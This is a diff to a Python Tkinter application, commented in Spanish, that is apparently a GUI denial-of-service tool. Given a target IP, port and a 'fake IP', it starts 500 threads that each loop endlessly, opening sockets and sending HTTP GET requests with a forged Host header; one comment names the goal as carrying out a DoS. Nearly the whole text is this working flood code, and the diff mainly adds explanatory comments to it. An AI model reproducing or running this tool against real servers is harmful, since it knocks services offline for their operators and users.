@@ -115,26 +115,27 @@ class App:
 
 
     def GButton_797_command(self):
+        # Aqui declaramos las variables que recibiran los valores que se introduciran en los inputs de la ventana
         fake_ip = self.fakeip.get()
         host = self.targetip.get()
         port = self.puerto.get()
+        #Mediante socket estableceremos conexion mediante el puerto especificado a el servidor web que hemos especificado
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         estado=sock.connect_ex((host,port))
-        
+        #Si se consigue conectar al objetivo, es decir se establece la conexion
         if estado==0:
-                
-                
+            #En esta parte de label se mostraran dichos mensajes en la ventana       
             label = tk.Label(root,text="Conexion probada=OK",fg="blue",bg="black",justify="center")
-            print("hecho")
             label.place(x=30,y=self.cont,width=530,height=20)
             self.cont=self.cont+20
-            label = tk.Label(root,text="Esta accion puede tardar...",fg="green",bg="black",justify="center")
-                
+            label = tk.Label(root,text="Esta accion puede tardar...",fg="green",bg="black",justify="center")               
             label.place(x=30,y=self.cont,width=530,height=20)
             self.cont=self.cont+20
+            #En el siguiente bucle for mediante la libreria threading optimizamos la ejecucion de la funcion attack
             for i in range(500):
                 thread = threading.Thread(target=self.attack)
                 thread.start()
+        #Si no se establece una conexion con el objetivo en la ventana aparecera un mensaje de error
         else:
             self.cont=self.cont+20
             label = tk.Label(root,text= "Error - No se pudo conectar al host.",fg="red",bg="black",justify="center")
@@ -142,22 +143,25 @@ class App:
         
         
     def attack(self):
+        # Aqui declaramos las variables que recibiran los valores que se introduciran en los inputs de la ventana
             fake_ip = self.fakeip.get()
             host = self.targetip.get()
             port = self.puerto.get()
+            #En este bucle se envian los paquetes al objetivo con la finalidad de hacer el DoS
             while True:
                 try:
+                    #Mediante socket estableceremos conexion mediante el puerto especificado a el servidor web que hemos especificado
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     s.connect((host, port))
+                    #Aqui se envia paquetes al objetivo
                     s.sendto(("GET /" + host + " HTTP/1.1\r\n").encode('ascii'), (host, port))
                     s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (host, port))
+                    #Se printea en la terminal para poder realizar un seguimiento
                     print(("GET /" + host + " HTTP/1.1\r\n").encode('ascii'), (host, port))
-                    print(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (host, port))
-                    #global attack_num
-                    #attack_num += 1
-                    #print(attack_num)
-                    
+                    print(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (host, port))            
+                    #Se cierra la conexion        
                     s.close()
+                #Excepcion para que se salga de la aplicacion si se presiona Ctrl+C
                 except KeyboardInterrupt:
                     print("Se presiono Ctrl+C")
                     sys.exit()
